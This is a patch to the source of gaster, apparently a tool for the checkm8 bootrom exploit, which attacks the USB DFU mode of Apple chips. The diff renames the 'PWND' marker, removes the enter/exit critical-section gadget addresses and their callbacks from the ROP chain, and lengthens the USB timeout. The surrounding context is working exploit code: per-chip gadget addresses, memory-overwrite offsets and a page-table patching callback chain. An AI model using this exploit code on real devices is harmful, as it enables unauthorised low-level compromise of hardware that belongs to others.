@@ -211,7 +211,7 @@ static uint16_t cpid;
 static bool manual_reset;
 static unsigned usb_timeout;
 static uint32_t ttb_addr, payload_dest_armv7;
-static const char *pwnd_str = " PWND:[gaster]";
+static const char *pwnd_str = " PWND:[checkm8]";
 static der_item_spec_t der_img4_item_specs[] = {
 	{ 0, DER_IA5_STR, 0 },
 	{ 1, DER_SEQ, 0 }
@@ -231,7 +231,7 @@ static struct {
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
 static size_t config_hole, ttb_rom_off, ttb_vrom_off, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, exit_critical_section, enter_critical_section, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
+static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
 static void
 sleep_ms(unsigned ms) {
@@ -880,8 +880,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			dfu_handle_request = 0x18004C378;
 			usb_core_do_transfer = 0x10000DDA4;
 			insecure_memory_base = 0x180000000;
-			exit_critical_section = 0x100009B88;
-			enter_critical_section = 0x100009B24;
 			handle_interface_request = 0x10000E0B4;
 			usb_create_string_descriptor = 0x10000D280;
 			usb_serial_number_string_descriptor = 0x18004486A;
@@ -939,8 +937,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			dfu_handle_request = 0x180088B48;
 			usb_core_do_transfer = 0x10000DC98;
 			insecure_memory_base = 0x1800B0000;
-			exit_critical_section = 0x10000A514;
-			enter_critical_section = 0x10000A4B8;
 			handle_interface_request = 0x10000DFB8;
 			usb_create_string_descriptor = 0x10000D150;
 			usb_serial_number_string_descriptor = 0x1800805DA;
@@ -964,8 +960,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			dfu_handle_request = 0x180088A58;
 			usb_core_do_transfer = 0x10000DD64;
 			insecure_memory_base = 0x1800B0000;
-			exit_critical_section = 0x10000A6A0;
-			enter_critical_section = 0x10000A658;
 			handle_interface_request = 0x10000E08C;
 			usb_create_string_descriptor = 0x10000D234;
 			usb_serial_number_string_descriptor = 0x18008062A;
@@ -989,8 +983,6 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			dfu_handle_request = 0x180008638;
 			usb_core_do_transfer = 0x10000B9A8;
 			insecure_memory_base = 0x18001C000;
-			exit_critical_section = 0x10000F9A0;
-			enter_critical_section = 0x10000F958;
 			handle_interface_request = 0x10000BCCC;
 			usb_create_string_descriptor = 0x10000AE80;
 			usb_serial_number_string_descriptor = 0x1800008FA;
@@ -1014,15 +1006,13 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			dfu_handle_request = 0x180008B08;
 			usb_core_do_transfer = 0x10000BD20;
 			insecure_memory_base = 0x18001C000;
-			exit_critical_section = 0x10000FA00;
-			enter_critical_section = 0x10000F9B8;
 			handle_interface_request = 0x10000BFFC;
 			usb_create_string_descriptor = 0x10000B1CC;
 			usb_serial_number_string_descriptor = 0x18000082A;
 		}
 		if(cpid != 0) {
 			printf("CPID: 0x%" PRIX32 "\n", cpid);
-			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL || strstr(usb_serial_num, " PWND:[ipwnder]") != NULL;
+			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[ipwnder]") != NULL;
 			ret = true;
 		}
 		free(usb_serial_num);
@@ -1273,13 +1263,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		uint32_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, usb_core_do_transfer;
 	} handle_checkm8_request_armv7;
 	callback_t callbacks[] = {
-		{ enter_critical_section, 0 },
 		{ write_ttbr0, insecure_memory_base },
 		{ tlbi, 0 },
 		{ insecure_memory_base + ARM_16K_TT_L2_SZ + ttbr0_sram_off + 2 * sizeof(uint64_t), 0 },
 		{ write_ttbr0, ttbr0_addr },
 		{ tlbi, 0 },
-		{ exit_critical_section, 0 },
 		{ ret_gadget, 0 }
 	};
 	size_t i, data_sz, packet_sz, payload_sz, overwrite_sz, payload_handle_checkm8_request_sz;
@@ -1948,7 +1936,7 @@ main(int argc, char **argv) {
 	usb_handle_t handle;
 
 	if(env_usb_timeout == NULL || sscanf(env_usb_timeout, "%u", &usb_timeout) != 1) {
-		usb_timeout = 5;
+		usb_timeout = 10;
 	}
 	printf("usb_timeout: %u\n", usb_timeout);
 	manual_reset = getenv("MANUAL_RESET") != NULL;
